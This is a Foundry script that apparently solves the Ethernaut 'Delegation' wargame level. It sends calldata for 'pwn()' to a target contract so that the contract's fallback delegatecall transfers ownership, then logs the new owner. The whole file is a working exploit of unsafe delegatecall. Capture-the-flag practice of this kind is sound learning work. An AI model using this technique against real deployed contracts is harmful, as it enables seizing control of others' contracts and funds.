// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

import {Script,console} from "forge-std/Script.sol";
import {Delegation} from "../src/Delegation.sol";
// import {Attack} from "../src/Attack.sol";

contract Solve is Script {
    // Attack attack;
    Delegation delegation;
    address instanceAddr = 0xA0B1E5F4Be9af8DdA96705B1f12207869DA5282F;
    function run() external {
        delegation = Delegation(instanceAddr);
        bytes memory payload = abi.encodeWithSignature("pwn()");
        
        vm.startBroadcast();
        (bool ok,) = address(delegation).call(payload);
        // require(success);
    
        // attack = new Attack(delegation);
        // attack.callFallback();
        vm.stopBroadcast();
        console.log(delegation.owner(), ok);
    }
}